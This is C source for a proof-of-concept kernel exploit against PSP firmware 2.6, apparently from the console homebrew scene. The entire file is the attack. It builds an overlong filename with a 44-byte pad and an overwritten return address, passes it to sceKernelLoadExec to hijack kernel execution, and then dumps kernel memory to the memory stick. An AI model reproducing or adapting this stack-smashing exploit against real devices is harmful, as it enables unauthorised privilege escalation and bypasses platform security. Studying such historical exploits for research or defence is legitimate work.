// -------------------------------------------
// Kernel access under firmware 2.6 (and maybe 2.01 & 2.5 aswell)
// Requires fanjita's loader running under GTA
// -------------------------------------------
// * Proof of concept code *
// Written by hitchhikr / Neural.
// -------------------------------------------

// -------------------------------------------
// Include
#include <pspkernel.h>
#include <pspdisplay.h>
#include <stdlib.h>
#include <stdio.h>
#include <math.h>
#include <string.h>

PSP_MODULE_INFO("2.6ploitation", 0, 1, 1);
PSP_MAIN_THREAD_ATTR(THREAD_ATTR_USER);

 
// -------------------------------------------
// This one will be executed in kernel mode
void kernel_proc(void)
{
	pspDebugScreenInit();

	pspDebugScreenPrintf("Kernel proc called\n");

	int handle = sceIoOpen("ms0:/reboot_v260.BIN", PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);
	sceIoWrite(handle, (void*) 0x883f0000, 0x2000);
	sceIoClose(handle);

	pspDebugScreenPrintf("Memory dumped\n");

	for(;;)
		;
}

// -------------------------------------------
// Program entry point
int main(int argc, char* argv[]) {
	int i;
   	int handle;
   
	char filename[256];
	unsigned int *dwfilename;
	// This address must *NOT* contains a 00
	unsigned int *loop = (unsigned int *) 0x9f02020;
	unsigned int *loopsrc = (unsigned int *) &kernel_proc;
	char *msg = "chhikr hitchhikr hitchhikr hitchhikr hitchik";

	sceKernelDcacheWritebackAll();

	// Copy the test code into a safe place
	for(i = 0; i < 100; i++) {
		loop[i] = loopsrc[i];
	}
	memset(filename, 0, sizeof(filename));
	// Fill it with shit (*MUST* be 44 bytes)
	for(i = 0; i < 44; i++) {
		filename[i] = msg[i];
	}
	// Own the $ra
	dwfilename = (unsigned int *) &filename[44];
	dwfilename[0] = (unsigned int) loop;
	// Complete the string
	filename[48] = ':';
	filename[49] = '\0';

	// We need this for some odd flushing (?) reasons
	handle = sceIoOpen("ms0:/odd.BIN", PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);
	sceIoWrite(handle, dwfilename, 4);
	sceIoClose(handle);

	sceKernelLoadExec(filename, NULL); 	
	return(0);
}

